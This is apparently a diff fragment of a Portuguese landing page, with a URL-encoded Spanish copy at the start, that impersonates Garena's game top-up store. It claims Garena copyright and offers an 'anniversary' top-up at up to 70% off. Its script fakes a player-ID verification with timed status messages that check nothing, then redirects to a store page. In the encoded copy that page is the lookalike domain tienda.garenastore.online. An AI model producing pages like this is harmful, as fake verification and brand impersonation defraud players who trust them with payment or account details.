argin%3A0%20auto%2015px%3B%20border%3A6px%20solid%20%23f3f3f3%3B%20border-top%3A6px%20solid%20%23d32f2f%3B%20border-radius%3A50%25%3B%20width%3A50px%3B%20height%3A50px%3B%20animation%3Aspin%201s%20linear%20infinite%3B%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%3Cp%20id%3D%22popupMessage%22%20style%3D%22font-size%3A15px%3B%20color%3A%23333%3B%20margin%3A0%3B%22%3EVerificando%20jugador...%3C%2Fp%3E%0A%20%20%3C%2Fdiv%3E%0A%3C%2Fdiv%3E%0A%0A%3Cscript%3E%0A%20%20const%20startBtn%20%3D%20document.getElementById('startBtn')%3B%0A%20%20const%20popupOverlay%20%3D%20document.getElementById('popupOverlay')%3B%0A%20%20const%20popupMessage%20%3D%20document.getElementById('popupMessage')%3B%0A%0A%20%20startBtn.addEventListener('click'%2C%20function()%20%7B%0A%20%20%20%20const%20playerID%20%3D%20document.getElementById('playerID').value.trim()%3B%0A%20%20%20%20if%20(!playerID)%20%7B%0A%20%20%20%20%20%20alert('Por%20favor%2C%20introduce%20el%20ID%20del%20jugador.')%3B%0A%20%20%20%20%20%20return%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20popupOverlay.style.display%20%3D%20'flex'%3B%0A%20%20%20%20popupMessage.textContent%20%3D%20'Verificando%20jugador...'%3B%0A%0A%20%20%20%20setTimeout(()%20%3D%3E%20%7B%0A%20%20%20%20%20%20popupMessage.textContent%20%3D%20'Aplicando%20promoci%C3%B3n...'%3B%0A%20%20%20%20%7D%2C%201000)%3B%0A%0A%20%20%20%20setTimeout(()%20%3D%3E%20%7B%0A%20%20%20%20%20%20popupMessage.textContent%20%3D%20'Jugador%20encontrado...'%3B%0A%20%20%20%20%7D%2C%202000)%3B%0A%0A%20%20%20%20setTimeout(()%20%3D%3E%20%7B%0A%20%20%20%20%20%20window.location.href%20%3D%20'https%3A%2F%2Ftienda.garenastore.online%2Frecarga'%3B%0A%20%20%20%20%7D%2C%203000)%3B%0A%20%20%7D)%3B%0A%3C%2Fscript%3E%0A%0A%3Cstyle%3E%0A%40keyframes%20spin%20%7B%0A%20%200%25%20%7B%20transform%3A%20rotate(0deg)%3B%20%7D%0A%20%20100%25%20%7B%20transform%3A%20rotate(360deg)%3B%20%7D%0A%7D%0A%3C%2Fstyle%3E%0A" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="1" medium-editor-index="5a52ef9c-adca-7c57-e92b-02e262d85a6c" data-height="45" data-originalpos="132"><div style="max-width: 400px; width: 100%; padding: 10px; box-sizing: border-box; background-color: #f5f5f5; border-radius: 6px; font-family: Arial, sans-serif;">
+  <label style="font-weight: bold; font-size: 14px; color: #000; display: block; margin-bottom: 5px;">
+    ID do jogador <span title="Digite seu ID de jogador" style="cursor: help;">�</span>
+  </label>
+  <div style="display: flex; border: 1px solid #ccc; border-radius: 6px; overflow: hidden; background-color: white;">
+    <input id="playerID" type="text" placeholder="Digite o ID do jogador." style="flex: 1; border: none; padding: 10px; font-size: 14px; outline: none; color: #333;">
+    <button id="startBtn" style="background-color: #d32f2f; color: white; border: none; padding: 0 20px; font-weight: bold; cursor: pointer;">
+      Iniciar
+    </button>
+  </div>
+</div>
+
+<!-- Popup -->
+<div id="popupOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.7); 
+  align-items:center; justify-content:center; z-index:9999;">
+  <div style="background:white; padding:30px; border-radius:12px; text-align:center; width:280px; box-shadow:0 0 20px rgba(0,0,0,0.3);">
+    <div class="loader" style="margin:0 auto 15px; border:6px solid #f3f3f3; border-top:6px solid #d32f2f; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite;"></div>
+    <p id="popupMessage" style="font-size:15px; color:#333; margin:0;">Verificando jogador...</p>
+  </div>
+</div>
+
+<script>
+  const startBtn = document.getElementById('startBtn');
+  const popupOverlay = document.getElementById('popupOverlay');
+  const popupMessage = document.getElementById('popupMessage');
+
+  startBtn.addEventListener('click', function() {
+    const playerID = document.getElementById('playerID').value.trim();
+    if (!playerID) {
+      alert('Por favor, digite o ID do jogador.');
+      return;
+    }
+
+    popupOverlay.style.display = 'flex';
+    popupMessage.textContent = 'Verificando jogador...';
+
+    setTimeout(() => {
+      popupMessage.textContent = 'Aplicando promoção...';
+    }, 1000);
+
+    setTimeout(() => {
+      popupMessage.textContent = 'Jogador encontrado...';
+    }, 2000);
+
+    setTimeout(() => {
+      window.location.href = '/loja';
+    }, 3000);
+  });
+</script>
+
+<style>
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</div><div class="fit-content g-iWbRuIT is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="245" data-height="62.0625" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="72134226-3420-d425-d52d-afd2f611e59d"> <h2 class="g-Lnqjnbi"><b class="g-cG7ysY9">Faça login com seu ID para ver as recargas disponíveis e resgatar seu bônus!</b><br class="g-Nr0TKnZ"></h2>
+</div><div class="fit-content g-lm4CQG5 is-block is-text new-block-1 mob-alterado medium-editor-element n-responsive" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" spellcheck="false" data-originalpos="308" data-height="32.1875" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="3" medium-editor-index="2474ffa3-847e-45e9-aba8-11bce952f5bc" data-medium-focused="true"> <h2 class="g-ffGqrUh"><b class="g-uDotP7n">Recarga de aniversário desbloqueada com até 70% de desconto + 20% de bônus!</b><br class="g-tu84WvJ"></h2>
+</div><div class="is-block bloco-novo bloco-texto bloco-selecto g-gOIDfL6 mob-alterado n-responsive" data-height="74.00000000000003" data-originalpos="296"></div><div class="is-block bloco-texto novo-bloco is-text fit-content overlap g-rxr7i5L bloco-imagem new-block-1 mob-alterado n-responsive mobile-alterado" spellcheck="false" data-height="33" data-originalpos="316">
+          <div class="landingpage-widget-imagem">
+            
+        <img loading="lazy" alt="Imagem" style="width: 100%; height: 100%;" src="images/68f413c5c858d.png" class="g-afopz0M active" id="img_IT1QgBp" data-width="33">
+    
+          </div>
+        </div></section><section class="is-section g-TnzUoDG" id="s-sm5XBhQ" style="pointer-events: none; transform: translate3d(0px, 0px, 0px) rotate(0.0001deg); transform-style: preserve-3d; backface-visibility: hidden;"><div class="fit-content g-SqrDjUC is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="15" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="5a5e2bdb-9ff6-0f9a-fb05-3d087e4e43ef"> <h2 class="g-PRTMDlH">© Garena Online. Todos os direitos reservados.
+
+<br class="g-BZXHVpd"></h2>
+</div><div class="fit-content g-Wd4KfvA is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" spellcheck="false" data-medium-focused="true" data-originalpos="43" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="1" medium-editor-index="b448e9cf-05fb-35d1-c97e-13efd08a42c8"> <h2 class="g-DlWukTg"><a href="https://recargajogo.com.br/faq" class="g-yg4Uivt">FAQ
+
+</a><br class="g-UGmfJeb"></h2>
+</div><div class="fit-content g-GjsF7J2 is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" data-originalpos="66" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="8c8d2946-70e1-0e84-b06e-844b766544a0"> <h2 class="g-nyMVEaz"><a href="https://content.garena.com/legal/tos/tos_pt.html" class="g-MehfYqT">Termos e condições
+
+</a><br class="g-bYvhehE"></h2>
+</div><div class="fit-content g-Cp9V6RZ is-block is-text new-block-1 mob-alterado n-responsive medium-editor-element" data-weightaceitos="200,300,400,600,700,800,900" data-fonte-index="16" spellcheck="false" data-originalpos="89" data-medium-editor-element="true" role="textbox" aria-multiline="true" data-medium-editor-editor-index="17" medium-editor-index="084531b9-07d5-c768-e255-401aeed086ca"> <h2 class="g-XkMyXs2"><a href="https://content.garena.com/legal/pp/pp_pt.html" class="g-qMTbukb">
+
+Política de privacidade
+
+</a><br class="g-qk6v3KB"></h2>
+</div></section><script class="script-rastreio-mouse-instancia" src="https://empreender.nyc3.digitaloceanspaces.com/static/LANDINGPAGE/parallaxInstancia"></script></main><script type="text/javascript" src="js/20250917-150019-8086_gz.js"></script>
+
+<script id="_content_js">
+	
+	var apenasMobile = 0 || 0;
+
+	if (apenasMobile === 1) {
+		setMobile();
+
+		document.body.classList.add('mobile-apenasmob')
+
+	} else {
+		window.addEventListener('resize', () => checkWidth());
+	}
+
+	var mobileNaoTravado = false;
+
+	if (window.innerWidth > 1024 && apenasMobile === 1) {
+		document.body.classList.add('mobile', 'mobile-desk');
+		document.body.classList.remove('mobile-travado');
+		mobileNaoTravado = true;
+	}
+
+	// se caso o mobile não seja travado mas esteja no mobile ele irá forçar os sliders a ter 1 visualização
+	if (window.innerWidth < 1024) {
+		apenasMobile = 1;
+		mobileNaoTravado = false;
+		setMobile();
+	}
+</script>
+<!-- <script src="https://app.landingpage.com.br/construtor/assets/js/galeria.js"></script> -->
+<!-- <script src="https://unpkg.com/ionicons@5.2.3/dist/ionicons/ionicons.js"></script> -->
+<!-- script dos blocos de progresso, não pode ficar no editor e por isso está aqui rsrs (TODO: Remover, deixar dinamico) -->
+
+	<script src="js/app.bundle.js"></script>
+
+<script src="https://empreender.nyc3.digitaloceanspaces.com/static/LANDINGPAGE/script-progresso"></script>
+<script src="https://empreender.nyc3.digitaloceanspaces.com/static/LANDINGPAGE/wow"></script>
+<script>
+	// window.onload = function() {
+	// wow para as 2views
+	new WOW({
+		scrollContainer: 'body',
+		offset: 50,
+	}).init();
+
+	new WOW().init({
+		offset: 50,
+	});
+	// };
+</script>
+
+<script>
+	// força os sliders a ficarem com apenas 1 visualização caso o mobile esteja travado
+	window.addEventListener('load', () => {
+		if (teste_arr) {
+			teste_arr?.forEach(slider => {
+				if (apenasMobile === 1) {
+					slider.glide.update({
+						perView: 1,
+					});
+				} else {
+					// mesmo salvando o perview errado no mobile ele irá colocar o correto aqui
+					slider.glide.update({
+						perView: slider.perView,
+					});
+				}
+			});
+		}
+	});
+</script>
+
+	<!--	0.0225510597229	-->
+
+
+
+</body></html>
